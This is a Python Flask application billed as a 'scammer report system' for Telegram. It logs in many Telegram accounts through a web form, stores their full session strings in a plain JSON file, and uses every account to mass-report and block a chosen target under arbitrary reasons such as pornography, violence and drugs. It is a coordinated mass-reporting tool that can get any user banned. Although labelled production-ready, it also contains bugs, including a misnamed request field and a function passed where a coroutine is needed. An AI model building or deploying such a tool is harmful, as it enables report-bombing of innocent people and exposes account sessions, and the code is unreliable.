#!/usr/bin/env python3
"""
Telegram Scammer Report System
Clean, production-ready code
"""

from flask import Flask, jsonify, request, render_template, redirect
from flask_cors import CORS
import asyncio
import threading
import time
import os
import json
import logging
from datetime import datetime
import traceback
import random
import requests
from concurrent.futures import ThreadPoolExecutor

# ============================================
# CONFIGURATION
# ============================================
API_ID = int(os.environ.get('API_ID', 'YOUR_API_ID'))
API_HASH = os.environ.get('API_HASH', 'YOUR_API_HASH')
PORT = int(os.environ.get('PORT', 10000))
SERVER_URL = os.environ.get('SERVER_URL', 'https://your-app.onrender.com')

# ============================================
# LOGGING SETUP
# ============================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('server.log')
    ]
)
logger = logging.getLogger(__name__)

# ============================================
# FLASK APP
# ============================================
app = Flask(__name__)
CORS(app)

# ============================================
# DEDICATED EVENT LOOP FOR TELEGRAM
# ============================================
class TelegramEventLoop:
    """Dedicated event loop in separate thread"""
    def __init__(self):
        self.loop = None
        self.ready = threading.Event()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
        self.ready.wait(timeout=10)
    
    def _run_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.ready.set()
        self.loop.run_forever()
    
    def run(self, coro, timeout=60):
        """Run coroutine in dedicated loop"""
        if not self.loop or self.loop.is_closed():
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
        
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=timeout)

# Initialize Telegram loop
telegram_loop = TelegramEventLoop()

# ============================================
# IMPORT TELEGRAM AFTER LOOP SETUP
# ============================================
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.functions.contacts import BlockRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonOther,
    InputReportReasonFake,
    InputReportReasonIllegalDrugs,
    InputReportReasonPersonalDetails,
    InputReportReasonCopyright,
)
from telethon.sessions import StringSession

# ============================================
# SESSION MANAGER - KEEPS ACCOUNTS CONNECTED
# ============================================
class SessionManager:
    """Manages persistent Telegram sessions"""
    def __init__(self):
        self.clients = {}
        self.lock = threading.Lock()
    
    def get_client(self, session_string, phone=''):
        """Get or create persistent client"""
        client_id = phone or session_string[:30]
        
        with self.lock:
            if client_id in self.clients:
                return self.clients[client_id]
            
            client = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True
            )
            
            try:
                telegram_loop.run(self._connect_client(client))
                self.clients[client_id] = client
                logger.info(f"Session created: {client_id[:15]}...")
                return client
            except Exception as e:
                logger.error(f"Session creation failed: {e}")
                return None
    
    async def _connect_client(self, client):
        """Connect client"""
        for _ in range(3):
            try:
                await client.connect()
                if await client.is_user_authorized():
                    return
                await asyncio.sleep(2)
            except:
                await asyncio.sleep(2)
    
    def reconnect_all(self):
        """Reconnect all clients"""
        with self.lock:
            for client_id, client in self.clients.items():
                try:
                    telegram_loop.run(self._connect_client(client))
                except:
                    pass
    
    def cleanup(self):
        """Remove disconnected clients"""
        with self.lock:
            dead = [cid for cid, client in self.clients.items() 
                   if not client.is_connected()]
            for cid in dead:
                del self.clients[cid]

session_manager = SessionManager()

# ============================================
# DATA STORAGE
# ============================================
class DataStore:
    """Thread-safe data storage"""
    def __init__(self):
        self.lock = threading.Lock()
        self.accounts = []
        self.reports = []
        self.temp_sessions = {}
        self.load()
    
    def load(self):
        """Load data from files"""
        try:
            if os.path.exists('accounts.json'):
                with open('accounts.json') as f:
                    self.accounts = json.load(f)
            if os.path.exists('reports.json'):
                with open('reports.json') as f:
                    self.reports = json.load(f)
            logger.info(f"Loaded {len(self.accounts)} accounts, {len(self.reports)} reports")
        except Exception as e:
            logger.error(f"Load error: {e}")
    
    def save_accounts(self):
        """Save accounts"""
        with self.lock:
            with open('accounts.json', 'w') as f:
                json.dump(self.accounts, f, indent=2)
    
    def save_reports(self):
        """Save reports"""
        with self.lock:
            with open('reports.json', 'w') as f:
                json.dump(self.reports, f, indent=2)
    
    def add_account(self, account):
        """Add account"""
        with self.lock:
            self.accounts.append(account)
            self.save_accounts()
    
    def add_report(self, report):
        """Add report"""
        with self.lock:
            self.reports.append(report)
            if len(self.reports) > 1000:
                self.reports.pop(0)
            self.save_reports()
    
    def get_active_accounts(self):
        """Get active accounts"""
        return [a for a in self.accounts if a.get('active', True)]

data_store = DataStore()

# ============================================
# REPORT REASONS
# ============================================
REPORT_REASONS = {
    'spam': InputReportReasonSpam(),
    'fake': InputReportReasonFake(),
    'violence': InputReportReasonViolence(),
    'pornography': InputReportReasonPornography(),
    'drugs': InputReportReasonIllegalDrugs(),
    'personal': InputReportReasonPersonalDetails(),
    'copyright': InputReportReasonCopyright(),
    'scam': InputReportReasonOther(),
    'other': InputReportReasonOther()
}

# ============================================
# CORE FUNCTIONS
# ============================================
def report_scammer(session_string, scammer_identifier, reasons, message="", phone=""):
    """Report scammer using one account"""
    
    async def _report():
        client = session_manager.get_client(session_string, phone)
        if not client:
            return {'success': False, 'error': 'Session error'}
        
        try:
            if not client.is_connected():
                await client.connect()
            
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Not authorized'}
            
            # Resolve scammer
            identifier = scammer_identifier.strip()
            scammer = None
            
            try:
                username = identifier.replace('@', '')
                scammer = await client.get_entity(username)
            except:
                try:
                    phone_num = identifier if identifier.startswith('+') else f'+{identifier}'
                    scammer = await client.get_entity(phone_num)
                except:
                    return {'success': False, 'error': 'User not found'}
            
            if not scammer:
                return {'success': False, 'error': 'User not found'}
            
            # Report with each reason
            success_count = 0
            
            for reason_key in reasons:
                reason = REPORT_REASONS.get(reason_key, InputReportReasonSpam())
                report_msg = f"Report: {message}" if message else "Scam report"
                
                # Method 1: Report peer
                try:
                    await client(functions.account.ReportPeerRequest(
                        peer=scammer,
                        reason=reason,
                        message=report_msg
                    ))
                    success_count += 1
                except errors.FloodWaitError as e:
                    await asyncio.sleep(min(e.seconds, 30))
                except:
                    pass
                
                # Method 2: Report message
                try:
                    await client(functions.messages.ReportRequest(
                        peer=scammer,
                        id=[0],
                        reason=reason,
                        message=report_msg
                    ))
                    success_count += 1
                except:
                    pass
                
                # Method 3: Block user
                try:
                    await client(functions.contacts.BlockRequest(scammer))
                    success_count += 1
                except:
                    pass
                
                await asyncio.sleep(random.uniform(1, 3))
            
            return {
                'success': success_count > 0,
                'reports_sent': success_count,
                'scammer_id': str(scammer.id)
            }
            
        except Exception as e:
            logger.error(f"Report error: {e}")
            return {'success': False, 'error': str(e)[:200]}
    
    return telegram_loop.run(_report, timeout=120)

def mass_report(scammer, reasons, message=""):
    """Report using all accounts"""
    accounts = data_store.get_active_accounts()
    
    if not accounts:
        return {'success': False, 'error': 'No accounts available'}
    
    logger.info(f"Mass reporting {scammer} with {len(accounts)} accounts")
    
    results = []
    success_count = 0
    total_reports = 0
    
    for account in accounts:
        try:
            result = report_scammer(
                account['session'],
                scammer,
                reasons,
                message,
                account.get('phone', '')
            )
            
            results.append({
                'account': account.get('name', 'Unknown'),
                'success': result.get('success', False),
                'reports': result.get('reports_sent', 0)
            })
            
            if result.get('success'):
                success_count += 1
                total_reports += result.get('reports_sent', 0)
            
            time.sleep(random.uniform(1, 2))
            
        except Exception as e:
            results.append({
                'account': account.get('name', 'Unknown'),
                'success': False,
                'error': str(e)[:100]
            })
    
    # Save report
    report_record = {
        'id': int(time.time() * 1000),
        'scammer': scammer,
        'reasons': reasons,
        'accounts_used': len(accounts),
        'successful': success_count,
        'total_reports': total_reports,
        'timestamp': datetime.now().isoformat()
    }
    data_store.add_report(report_record)
    
    return {
        'success': success_count > 0,
        'scammer': scammer,
        'accounts_used': len(accounts),
        'successful_accounts': success_count,
        'total_reports': total_reports,
        'results': results
    }

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def login_page():
    return render_template('login.html')

@app.route('/report')
def report_page():
    return render_template('report.html')

@app.route('/ping')
def ping():
    active = len(data_store.get_active_accounts())
    return jsonify({
        'status': 'ok',
        'accounts': active,
        'sessions': len(session_manager.clients),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/accounts')
def get_accounts():
    accounts = data_store.get_active_accounts()
    return jsonify({
        'success': True,
        'accounts': [{
            'id': a['id'],
            'name': a.get('name', 'Unknown'),
            'phone': a.get('phone', '')[-4:].rjust(len(a.get('phone', '')), '*') if a.get('phone') else 'Unknown',
            'active': a.get('active', True)
        } for a in accounts],
        'count': len(accounts)
    })

@app.route('/api/report', methods=['POST'])
def submit_report():
    """Handle report submission"""
    try:
        data = request.get_json()
        scammer = data.get('scanner', '').strip()
        reasons = data.get('reasons', ['spam', 'scam'])
        message = data.get('message', '')
        
        if not scammer:
            return jsonify({'success': False, 'error': 'Enter username or phone number'})
        
        if not reasons:
            return jsonify({'success': False, 'error': 'Select at least one reason'})
        
        # Validate reasons
        valid_reasons = [r for r in reasons if r in REPORT_REASONS]
        if not valid_reasons:
            valid_reasons = ['spam', 'scam']
        
        logger.info(f"Report: {scammer} | Reasons: {valid_reasons}")
        
        result = mass_report(scammer, valid_reasons, message)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Submit error: {e}\n{traceback.format_exc()}")
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Send verification code"""
    try:
        phone = request.get_json().get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                return {
                    'success': True,
                    'phone_code_hash': result.phone_code_hash,
                    'session': client.session.save()
                }
            finally:
                await client.disconnect()
        
        result = telegram_loop.run(send_code(), timeout=30)
        
        if result.get('success'):
            session_id = str(int(time.time() * 1000))
            data_store.temp_sessions[session_id] = {
                'phone': phone,
                'hash': result['phone_code_hash'],
                'session': result['session'],
                'created_at': time.time()
            }
            
            return jsonify({
                'success': True,
                'session_id': session_id,
                'message': 'Code sent to Telegram'
            })
        
        return jsonify({'success': False, 'error': 'Failed to send code'})
        
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify code and add account"""
    try:
        data = request.get_json()
        code = data.get('code', '')
        session_id = data.get('session_id', '')
        password = data.get('password', '')
        
        if session_id not in data_store.temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        temp = data_store.temp_sessions[session_id]
        
        async def verify():
            client = TelegramClient(
                StringSession(temp['session']),
                API_ID,
                API_HASH
            )
            await client.connect()
            try:
                try:
                    await client.sign_in(
                        temp['phone'],
                        code,
                        phone_code_hash=temp['hash']
                    )
                except errors.SessionPasswordNeededError:
                    if not password:
                        return {'need_password': True}
                    await client.sign_in(password=password)
                
                me = await client.get_me()
                
                account = {
                    'id': str(int(time.time() * 1000)),
                    'phone': me.phone or temp['phone'],
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'Reporter',
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'added_at': datetime.now().isoformat()
                }
                
                data_store.add_account(account)
                
                # Initialize session
                session_manager.get_client(account['session'], account['phone'])
                
                return {
                    'success': True,
                    'account': {
                        'id': account['id'],
                        'name': account['name'],
                        'phone': account['phone'][:4] + '****' if account.get('phone') else 'Unknown'
                    }
                }
                
            finally:
                await client.disconnect()
        
        result = telegram_loop.run(verify(), timeout=45)
        
        if result.get('success'):
            del data_store.temp_sessions[session_id]
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Verify error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/stats')
def get_stats():
    """Get report statistics"""
    reports = data_store.reports[-20:] if data_store.reports else []
    accounts = len(data_store.get_active_accounts())
    
    return jsonify({
        'success': True,
        'stats': {
            'total_reports': sum(r.get('total_reports', 0) for r in reports),
            'scammers_reported': len(reports),
            'accounts': accounts,
            'recent': reports[::-1][:10]
        }
    })

# ============================================
# MAINTENANCE
# ============================================
def maintenance():
    """Background maintenance"""
    while True:
        time.sleep(300)  # Every 5 minutes
        try:
            # Keep alive
            requests.get(f"{SERVER_URL}/ping", timeout=10)
            
            # Reconnect sessions
            session_manager.reconnect_all()
            session_manager.cleanup()
            
            # Clean temp sessions
            current_time = time.time()
            expired = [
                sid for sid, data in data_store.temp_sessions.items()
                if current_time - data.get('created_at', 0) > 3600
            ]
            for sid in expired:
                del data_store.temp_sessions[sid]
            
            logger.info(f"Maintenance: {len(session_manager.clients)} sessions")
            
        except Exception as e:
            logger.error(f"Maintenance error: {e}")

# ============================================
# STARTUP
# ============================================
threading.Thread(target=maintenance, daemon=True).start()

# Initialize sessions for existing accounts
for account in data_store.accounts:
    if account.get('session'):
        try:
            session_manager.get_client(account['session'], account.get('phone', ''))
        except:
            pass

print(f"""
╔══════════════════════════════════════╗
║  SCAMMER REPORT SYSTEM               ║
╠══════════════════════════════════════╣
║  Port: {PORT}                          ║
║  Accounts: {len(data_store.accounts)}                         ║
║  Status: Running                     ║
╚══════════════════════════════════════╝
""")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
